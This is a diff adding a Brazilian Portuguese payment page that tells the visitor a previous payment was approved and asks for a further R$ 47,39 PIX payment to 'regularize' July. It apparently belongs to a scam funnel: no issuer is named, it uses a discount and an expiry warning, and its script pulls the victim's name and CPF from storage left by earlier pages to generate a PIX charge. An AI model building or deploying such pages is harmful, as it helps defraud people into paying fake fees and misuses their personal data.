@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pagamento Aprovado • Regularização 2024</title>
+<link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{background:#f5f7fb;color:#223}
+.wrap{max-width:640px;margin:0 auto;padding:24px}
+.card{background:#fff;border:1px solid #e5e7eb;border-radius:12px;padding:20px;box-shadow:0 6px 20px rgba(0,0,0,.06)}
+.title{color:#0c326f;font-weight:700;font-size:20px;text-align:center;margin:10px 0}
+.subtitle{color:#475569;text-align:center;margin:4px 0 16px 0}
+.badge{display:inline-block;padding:6px 10px;border-radius:999px;background:#d1fae5;color:#065f46;font-weight:700;font-size:12px}
+.cta{display:block;width:100%;background:#0c326f;color:#fff;border:none;border-radius:8px;padding:14px 18px;font-size:16px;font-weight:700;cursor:pointer}
+.cta:disabled{background:#94a3b8;cursor:not-allowed}
+.note{font-size:12px;color:#64748b;text-align:center;margin-top:10px}
+.qr{display:none; margin-top:16px}
+.qr img{width:180px;height:180px;object-fit:contain;border:2px solid #0c326f;border-radius:8px;padding:8px;background:#fff;display:block;margin:0 auto}
+.pixbox{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:12px;margin-top:12px;font-family:monospace;font-size:12px;color:#334155;max-height:180px;overflow:auto}
+.copy{width:100%;padding:12px;border:none;border-radius:8px;background:#0c326f;color:#fff;font-weight:700;margin-top:10px;cursor:pointer}
+.footer{margin-top:18px;text-align:center;border-top:1px solid #e5e7eb;padding-top:12px}
+.footer img{width:80px;height:50px;object-fit:contain;border-radius:6px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="card">
+    <div style="text-align:center;margin-bottom:8px">
+      <span class="badge">Pagamento anterior aprovado</span>
+    </div>
+    <h1 class="title">Regularize também o período de julho</h1>
+    <p class="subtitle">Para concluir sua regularização, pague o ajuste de julho.</p>
+    <div class="card" style="border-color:#bfdbfe;background:#eff6ff;padding:14px;margin-bottom:14px">
+      <p style="text-align:center;color:#0c326f;font-weight:700">Valor com desconto</p>
+      <p style="text-align:center;color:#0c326f;font-size:22px;font-weight:800">R$ 47,39</p>
+    </div>
+    <button id="btnGerar" class="cta"><i class="fas fa-qrcode" style="margin-right:8px"></i>Gerar PIX de R$ 47,39</button>
+
+    <div id="qrWrap" class="qr">
+      <div style="text-align:center;margin:8px 0">
+        <p style="color:#0c326f;font-weight:700">QR Code PIX</p>
+      </div>
+      <img id="qrImg" alt="QR Code PIX">
+      <div class="pixbox" id="pixCodeBox"></div>
+      <button id="btnCopy" class="copy"><i class="fas fa-copy" style="margin-right:6px"></i>Copiar código PIX</button>
+      <p class="note">O código expira em alguns minutos.</p>
+    </div>
+
+    <div class="footer">
+      <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" alt="PIX">
+      <p style="font-size:12px;color:#64748b;margin-top:6px">Transação via sistema PIX</p>
+    </div>
+  </div>
+</div>
+
+<script>
+function getCustomer(){
+  try{
+    var n=localStorage.getItem('lastCustomerName')||'Cliente';
+    var c=localStorage.getItem('lastCustomerCpf')||'';
+    return {name:n.trim(),cpf:(c||'').replace(/\\D/g,'')};
+  }catch(e){return {name:'Cliente',cpf:''}}
+}
+function genUrl(pixCode){return 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data='+encodeURIComponent(pixCode)}
+async function gerarPix(){
+  var btn=document.getElementById('btnGerar');
+  btn.disabled=true;
+  var u=getCustomer();
+  var params=new URLSearchParams({
+    amount:'4739',
+    customer_name:u.name,
+    customer_cpf:u.cpf||'05531510101',
+    customer_email:'cliente@example.com',
+    customer_phone:'11999999999'
+  });
+  try{
+    var r=await fetch('/api/generate-pix?'+params.toString(),{method:'GET',headers:{'Content-Type':'application/json'}});
+    var text=await r.text();
+    console.log('Response status:',r.status);
+    console.log('Response text:',text);
+    var data=JSON.parse(text);
+    if(!data.success||!(data.pixCode||data.pix_code)){btn.disabled=false;alert('Erro ao gerar PIX: '+JSON.stringify(data));return}
+    var code=data.pixCode||data.pix_code;
+    document.getElementById('qrImg').src=genUrl(code);
+    document.getElementById('pixCodeBox').textContent=code;
+    document.getElementById('qrWrap').style.display='block';
+  }catch(e){
+    console.error('Erro:',e);
+    alert('Erro ao gerar PIX: '+e.message);
+    btn.disabled=false;
+  }
+}
+document.getElementById('btnGerar').addEventListener('click',gerarPix);
+document.getElementById('btnCopy').addEventListener('click',function(){
+  var t=document.getElementById('pixCodeBox').textContent.trim();
+  if(!t)return;
+  navigator.clipboard.writeText(t).then(function(){
+    document.getElementById('btnCopy').textContent='Código copiado';
+    setTimeout(function(){document.getElementById('btnCopy').innerHTML='<i class="fas fa-copy" style="margin-right:6px"></i>Copiar código PIX'},3000);
+  });
+});
+</script>
+</body>
+</html>
